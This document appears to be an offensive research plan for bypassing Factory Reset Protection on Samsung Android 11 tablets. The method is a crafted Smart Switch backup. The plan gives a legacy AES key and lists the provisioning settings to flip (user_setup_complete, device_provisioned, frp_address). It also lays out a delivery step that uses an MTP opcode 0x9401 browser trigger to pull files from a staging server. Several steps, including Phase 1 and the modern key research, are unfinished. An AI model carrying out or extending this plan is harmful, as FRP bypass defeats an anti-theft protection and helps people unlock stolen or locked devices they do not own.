# Project LANDFALL-SWITCH: Samsung Android 11 FRP Bypass Strategy

## 1. Objective
To bypass Factory Reset Protection (FRP) on Samsung Android 11 devices (Target: Galaxy Tab A8) by injecting a modified SettingsProvider configuration through a crafted Smart Switch (EasyMover) backup.

## 2. Research & Environment Setup
- **Emulator:** Android 11 (API 30) x86_64 Google APIs image (Downloading...).
- **Analysis Tools:**
    - `apktool` / `jadx-gui`: For decompiling `EasyMover.apk`.
    - `openssl` / `pycryptodome`: For AES-256-CBC decryption/encryption.
- **App:** `com.sec.android.easyMover` (Smart Switch).
- **Encryption Algorithm:** AES-256-CBC (standard for EasyMover `.exml` and `.senc` files).
- **Potential Keys:**
    - Legacy Key: `backup data!!!!` (Hex: `6261636b757020646174612121212121`)
    - Modern Key: Likely derived from a static string in `libccrypto.so` or `EasyMover` Java classes.

## 3. Detailed Execution Plan

### Phase 1: Baseline Extraction (Emulator)
... [rest of Phase 1] ...

### Phase 2: Decryption & Manipulation
1.  Identify the `.exml` file containing `SettingsProvider` data (e.g., `SystemSettings.exml`).
2.  Decrypt the file using identified fixed keys.
3.  Modify the following XML keys in the decrypted `settings_secure.xml` and `settings_global.xml`:
    - `user_setup_complete` -> `1`
    - `device_provisioned` -> `1`
    - `setup_wizard_has_run` -> `1`
    - `frp_address` -> (Delete or set to empty)
4.  Re-encrypt the XML file, ensuring the file structure and metadata (hash/checksum) are preserved.

### Phase 3: Delivery Vector (Target Device)
1.  Connect the locked Samsung Tab A8 via USB.
2.  Execute the **MTP Browser Trigger** (OpCode `0x9401`):
    - OpCode: `0x9401`
    - Param1: `0x00000000`
    - Param2: `0x00000000`
    - Data: `https://youtube.com/redirect?q=supersploit.local/staging`
3.  Navigate to a local staging server (hosted by SuperSploit) to:
    - Download and install the Smart Switch APK (if the device doesn't have it).
    - Download the **Modified Backup Folder** to the device's internal storage or an SD card.
4.  Launch Smart Switch on the target.
5.  Select **Restore** -> **SD Card** -> **Modified Backup**.

### Phase 4: Finalization
1.  Once the restore process completes, reboot the device.
2.  Verify the "Setup Wizard" is bypassed and the device is fully functional.

## 4. Immediate Next Steps
- [ ] Monitor Android 11 System Image download (16% as of last check).
- [ ] Install `apktool` and `jadx` for local analysis.
- [ ] Extract `com.sec.android.easyMover` from a Samsung device or download a clean APK for analysis.
- [ ] Research specific AES keys for Smart Switch version 3.7+ (Android 11 era).
